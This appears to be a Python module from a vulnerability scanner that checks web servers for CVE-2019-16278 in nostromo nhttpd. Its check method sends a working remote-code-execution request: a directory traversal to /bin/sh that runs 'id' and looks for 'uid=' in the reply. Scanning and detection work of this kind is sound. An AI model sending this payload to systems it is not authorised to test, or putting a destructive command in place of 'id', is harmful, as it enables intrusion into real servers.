"""Agent Asteroid implementation for CVE-2019-16278"""

import datetime
from urllib import parse as urlparse

import requests
from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "NOSTROMO NHTTPD DIRECTORY TRAVERSAL VULNERABILITY"
VULNERABILITY_REFERENCE = "CVE-2019-16278"
VULNERABILITY_DESCRIPTION = """Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.
"""
RISK_RATING = "CRITICAL"

DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)


@exploits_registry.register
class CVE201916278Exploit(webexploit.WebExploit):
    accept_request = definitions.Request(method="GET", path="/")

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """Rule: heuristically detect if a specific target is valid.

        Args:
            target: Target to verify

        Returns:
            True if the target is valid; otherwise False.
        """
        target_endpoint = urlparse.urljoin(target.origin, self.accept_request.path)
        try:
            req = requests.Request(
                method=self.accept_request.method,
                url=target_endpoint,
                data=self.accept_request.data,
            ).prepare()
            resp = self.session.send(req, timeout=DEFAULT_TIMEOUT.seconds)
        except requests_exceptions.RequestException:
            return False

        server_header = resp.headers.get("Server", "")
        if "nostromo" in server_header:
            return True

        return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect specific vulnerability on a specific target.

        Args:
            target: Target to scan

        Returns:
            List of identified vulnerabilities.
        """
        vulnerabilities: list[definitions.Vulnerability] = []

        target_endpoint = urlparse.urljoin(
            target.origin, "/.%0d./.%0d./.%0d./.%0d./bin/sh"
        )
        payload = "echo\necho\n id 2>&1"
        headers = {
            "Content-Length": str(len(payload)),
            "User-Agent": "Mozilla/5.0",
        }

        # Force HTTP/1.0
        self.session._http_vsn = 10
        self.session._http_vsn_str = "HTTP/1.0"
        try:
            req = requests.Request(
                method="POST", url=target_endpoint, headers=headers, data=payload
            ).prepare()
            resp = self.session.send(
                req,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
        except requests_exceptions.RequestException:
            return vulnerabilities

        if "uid=" in resp.text:
            vulnerability = self._create_vulnerability(target)
            vulnerabilities.append(vulnerability)

        return vulnerabilities
